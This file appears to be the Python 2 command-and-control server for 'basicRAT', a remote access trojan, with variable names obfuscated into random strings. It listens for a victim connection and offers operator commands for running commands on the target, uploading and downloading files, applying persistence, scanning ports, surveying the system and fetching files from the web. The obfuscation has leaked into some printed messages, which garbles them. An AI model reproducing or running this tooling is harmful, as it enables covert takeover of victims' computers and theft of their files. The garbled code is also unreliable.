#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse
import readline
import socket
import struct
import sys
import time
try:
    from core.crypto import sUdzqtLgbOHLwwhpgZAqnWQnkYcohXdZ,rupicluuYAUuPXtZzzprBLFiIHrFbgdx,GZwddfwOTaBNFKKNcZkODnEKpIiNMMLm
    from core.filesock import sNdGHwfRcufgNuCsHbgAAzzPLlkgojAe, uwhiOqBSmedbvGGpKrsruHWAGHrUprFP
except ImportError as nIIdsEpTvQEohvLzsFtrwptbWNNxzJSk:
    print nIIdsEpTvQEohvLzsFtrwptbWNNxzJSk
    sys.exit(0)
pETZxiAzknEyrvKsOnhTIFdqGjoQpUyd = '''
download <files>    - Download file(s).
help                - Show this help menu.
persistence         - Apply persistence mechanism.
quit                - Gracefully kill client and server.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.
'''
mNZqLkmtEJHIAhPYBdqLxuJqeAJREMVT = '''
______           _     ______  ___ _____   _            _
| ___ \         (_)    | ___ \/ _ \_   _| | |          | |
| |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_
| ___ \/ _` / __| |/ __|    /|  _  || |   | __/ _ \/ __| __|
| |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_
\____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|
'''
EmZtFxTUgeGDKrXqoNRJejwcGCEaCKVX = [ 'download', 'help', 'persistence', 'quit', 'rekey', 'run',
             'scan', 'survey', 'unzip', 'upload', 'wget' ]
def BMDLnGIiUKJxfEUdhTeedXjqYREIhatA():
    lgUZJzDkaHeyRZuKCxAKXzcDBTSRLOls = argparse.ArgumentParser(description='basicRAT server')
    lgUZJzDkaHeyRZuKCxAKXzcDBTSRLOls.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return lgUZJzDkaHeyRZuKCxAKXzcDBTSRLOls
def kdouLsgGNghZiSMWCCgMSGHXwZSRPGcO():
    lgUZJzDkaHeyRZuKCxAKXzcDBTSRLOls  = BMDLnGIiUKJxfEUdhTeedXjqYREIhatA()
    IzOEJGRrCbjCiYYDYRVBBQJTCiCacylI    = vars(lgUZJzDkaHeyRZuKCxAKXzcDBTSRLOls.parse_args())
    oSWYQdqMVKzHKLEwpPwXYgscyrvwmwPi    = IzOEJGRrCbjCiYYDYRVBBQJTCiCacylI['port']
    DZqtnqwIIAtdcrVFFphUANAFRUgKenqA = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.bind(('0.0.0.0', oSWYQdqMVKzHKLEwpPwXYgscyrvwmwPi))
    except socket.error:
        print 'Error: Unable to start XNsOIHPopBIpeYvgSKSNjPwHtbrbvTJU, oSWYQdqMVKzHKLEwpPwXYgscyrvwmwPi {} in use?'.format(oSWYQdqMVKzHKLEwpPwXYgscyrvwmwPi)
        sys.exit(1)
    for DRJPzgtteNMcVgYqxduWLGvGkPCyUwtJ in mNZqLkmtEJHIAhPYBdqLxuJqeAJREMVT.split('\n'):
        time.sleep(0.05)
        print DRJPzgtteNMcVgYqxduWLGvGkPCyUwtJ
    print 'basicRAT XNsOIHPopBIpeYvgSKSNjPwHtbrbvTJU listening on oSWYQdqMVKzHKLEwpPwXYgscyrvwmwPi {}...'.format(oSWYQdqMVKzHKLEwpPwXYgscyrvwmwPi)
    DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.listen(10)
    HXkqtNNfHrDTPOyLEvgWvQIeHfTdkXut, ZZLSoznvcTQvgVPkCShuzIlxGjRxOspc = DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.accept()
    JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD = GZwddfwOTaBNFKKNcZkODnEKpIiNMMLm(HXkqtNNfHrDTPOyLEvgWvQIeHfTdkXut, XNsOIHPopBIpeYvgSKSNjPwHtbrbvTJU=True)
    while True:
        LWOcvjQJQskZAgphXzMwnQEmyNbaAQNU = raw_input('\n[{}] basicRAT> '.format(ZZLSoznvcTQvgVPkCShuzIlxGjRxOspc[0])).rstrip()
        if not LWOcvjQJQskZAgphXzMwnQEmyNbaAQNU:
            continue
        KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS, _, zVZRMkjmSSANRUTMtnVZiGTkHCKbkJsO = LWOcvjQJQskZAgphXzMwnQEmyNbaAQNU.partition(' ')
        if KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS not in EmZtFxTUgeGDKrXqoNRJejwcGCEaCKVX:
            print 'Invalid command, type "help" to see EOSBjCIkNHcpPEaxHocSUgxjrNoSwmSq list of commands.'
            continue
        if KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'help':
            print pETZxiAzknEyrvKsOnhTIFdqGjoQpUyd
            continue
        HXkqtNNfHrDTPOyLEvgWvQIeHfTdkXut.send(rupicluuYAUuPXtZzzprBLFiIHrFbgdx(LWOcvjQJQskZAgphXzMwnQEmyNbaAQNU, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD))
        if KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'quit':
            DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.close()
            sys.exit(0)
        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'run':
            EhnerJKnMsPBhZNlRbiSjZHDpvJxwOQj = HXkqtNNfHrDTPOyLEvgWvQIeHfTdkXut.recv(4096)
            print sUdzqtLgbOHLwwhpgZAqnWQnkYcohXdZ(EhnerJKnMsPBhZNlRbiSjZHDpvJxwOQj, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD).rstrip()
        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'download':
            for XxPlchPxQLRKcdYmEIicQIuINeJVwooa in zVZRMkjmSSANRUTMtnVZiGTkHCKbkJsO.split():
                XxPlchPxQLRKcdYmEIicQIuINeJVwooa = XxPlchPxQLRKcdYmEIicQIuINeJVwooa.strip()
                sNdGHwfRcufgNuCsHbgAAzzPLlkgojAe(HXkqtNNfHrDTPOyLEvgWvQIeHfTdkXut, XxPlchPxQLRKcdYmEIicQIuINeJVwooa, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD)
        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'upload':
            for XxPlchPxQLRKcdYmEIicQIuINeJVwooa in zVZRMkjmSSANRUTMtnVZiGTkHCKbkJsO.split():
                XxPlchPxQLRKcdYmEIicQIuINeJVwooa = XxPlchPxQLRKcdYmEIicQIuINeJVwooa.strip()
                uwhiOqBSmedbvGGpKrsruHWAGHrUprFP(HXkqtNNfHrDTPOyLEvgWvQIeHfTdkXut, XxPlchPxQLRKcdYmEIicQIuINeJVwooa, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD)
        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'rekey':
            JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD = GZwddfwOTaBNFKKNcZkODnEKpIiNMMLm(HXkqtNNfHrDTPOyLEvgWvQIeHfTdkXut, XNsOIHPopBIpeYvgSKSNjPwHtbrbvTJU=True)
        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
            print 'Running {}...'.format(KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS)
            EhnerJKnMsPBhZNlRbiSjZHDpvJxwOQj = HXkqtNNfHrDTPOyLEvgWvQIeHfTdkXut.recv(1024)
            print sUdzqtLgbOHLwwhpgZAqnWQnkYcohXdZ(EhnerJKnMsPBhZNlRbiSjZHDpvJxwOQj, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD)
if __name__ == '__main__':
    kdouLsgGNghZiSMWCCgMSGHXwZSRPGcO()
